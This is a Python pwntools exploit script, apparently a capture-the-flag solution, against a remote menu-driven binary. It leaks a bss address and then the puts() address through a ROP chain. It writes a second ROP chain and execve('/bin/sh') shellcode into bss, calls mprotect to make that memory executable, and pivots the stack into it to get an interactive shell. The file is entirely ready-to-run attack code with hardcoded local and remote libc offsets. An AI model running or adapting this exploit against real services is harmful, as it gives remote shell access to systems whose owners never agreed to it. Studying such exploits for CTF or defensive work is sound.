#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:s:b:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v
            

# local libc offsets           
            
system_offset=0x48e50
puts_system_distance=0x2d7a0
binsh_offset=0x18a152    
pop_rsp_offset=0x26e9b
pop_rsi_offset=0x2890f
pop_rdx_pop_offset=0xf948a
mprotect_offset=0xf8c20	

# remote libc offsets

system_offset=0x453a0            
puts_system_distance=0x2a300
binsh_offset=0x18ce17  
pop_rsp_offset=0x3838
pop_rsi_offset=0x202f8
pop_rdx_pop_offset=0x115164
mprotect_offset=0x101830
                            
io=remote(target, port)

#time.sleep(12)
#
# Stage 1 - leak bss data address
#

response=str(io.recvuntil(b"Exit\n>"),'utf-8')
print (response.strip())

io.sendline(b"2")
print (">>> We sent 2\n")

response=str(io.recvuntil(b"sell?"),'utf-8')
print (response.strip())

io.sendline(b"A")
print (">>> We sent A\n")
        
response=str(io.recvuntil(b"it?"),'utf-8')
print (response.strip())
        
io.sendline(b"123456781")
print (">>> We sent 123456781\n")

str(io.recvuntil(b"12345678"),'utf-8') 
addr=int.from_bytes(io.recvn(6),"little") 

base=addr-0x40c0
pop_rdi=base+0x13c3
sub_rsp=base+0x1219
got_puts=base+0x4018
plt_puts=base+0x1030
main=base+0x10a0

print (">>> Found address at "+hex(addr))
print (">>> Base address is "+hex(base))

#
# Stage 2 - leak puts() address
#

response=str(io.recvuntil(b"details:"),'utf-8')
print (response.strip())

payload=b"A"*40
payload+=p64(pop_rdi)
payload+=p64(got_puts)
payload+=p64(plt_puts)
payload+=p64(main)
payload+=p64(sub_rsp)

io.sendline(payload)
print (">>> Sent payload to leak puts() address\n")

io.recvn(1)
puts_addr=int.from_bytes(io.recvn(6),"little") 
print (">>> puts() address is "+hex(puts_addr))

#
# Stage 3 - put partial ROP chain and shellcode at bss data
#

system_addr=puts_addr-puts_system_distance
libc_base=system_addr-system_offset
binsh_addr=libc_base+binsh_offset

bss_addr=base+0x4000
bss_size=0x1000
bss_data=addr
bss_shellcode=addr+0x20
prot_exec=0x07

#
# Require these libc gadgests
#
#pop_rsp=libc_base+0x26e9b
#pop_rsi=libc_base+0x2890f
#pop_rdx_pop=libc_base+0xf948a
#mprotect=libc_base+0xf8c20	

pop_rsp=libc_base+pop_rsp_offset
pop_rsi=libc_base+pop_rsi_offset
pop_rdx_pop=libc_base+pop_rdx_pop_offset
mprotect=libc_base+mprotect_offset

shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

bss_payload=p64(pop_rsi)
bss_payload+=p64(bss_size)
bss_payload+=p64(mprotect)
bss_payload+=p64(bss_shellcode)
bss_payload+=shellcode
bss_payload+=b"\0"

response=str(io.recvuntil(b"Exit\n>"),'utf-8')
print (response.strip())

io.sendline(b"22")
print (">>> We sent 22\n")

response=str(io.recvuntil(b"sell?"),'utf-8')
print (response.strip())

io.sendline(b"A")
print (">>> We sent A\n")
        
response=str(io.recvuntil(b"it?"),'utf-8')
print (response.strip())

io.sendline(b"13.37")
print (">>> We sent 13.37\n")

response=str(io.recvuntil(b"look."),'utf-8')
print (response.strip())

io.sendline(bss_payload)
print (">>> Partial ROP chain and shellcode at "+hex(bss_addr)+"\n")

#
# Stage 4 - Trigger overflow to jump to ROP chain in bss
#

nop=0x90909090

payload=p64(nop)
payload+=p64(pop_rdi)
payload+=p64(bss_addr)
payload+=p64(pop_rdx_pop)
payload+=p64(prot_exec)
payload+=p64(sub_rsp)
payload+=p64(pop_rsp)
payload+=p64(bss_data)
payload+=p64(nop)
payload+=p64(sub_rsp)
        
        
response=str(io.recvuntil(b"Exit\n>"),'utf-8')
print (response.strip())

io.sendline(b"1")
print (">>> We sent 1\n")

response=str(io.recvuntil(b"details:"),'utf-8')
print (response.strip())

io.sendline(payload)
print (">>> Sent payload to jump to ROP chain on stack\n")

time.sleep(2)
io.interactive()


